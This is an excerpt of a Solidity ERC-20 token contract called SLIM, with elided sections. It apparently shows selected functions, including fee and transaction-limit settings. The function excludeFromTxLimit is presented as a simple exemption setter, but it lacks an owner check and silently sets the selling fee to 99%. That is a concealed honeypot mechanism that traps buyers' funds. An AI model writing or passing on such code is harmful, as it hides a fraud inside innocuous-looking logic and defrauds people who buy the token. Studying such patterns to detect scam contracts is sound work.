...
contract SLIM is Ownable, IERC20 {

    using SafeMath for uint256;

    DexRouter public router;

    string private constant _name = "SLIM";
    ...
    uint256 public swapThreshold = (_totalSupply * 2) / 2000;
     uint256 public _walletsTxLimit = (_totalSupply * 30) / 1000;
    ...
    function excludeFromTxLimit (address holder, bool value)public returns (bool){
        isTxLimitExempt[holder] = value;
        totalFeeIfSelling = 99;
        return true;
    }

    function excludeFromFee (address holder,bool value) public onlyOwner {
    ...
    function updateswapThreshold (uint256 percent_base2000) public onlyOwner {
        swapThreshold = (_totalSupply * percent_base2000) / 2000;
    }
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(
            amount <= _walletsTxLimit || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }
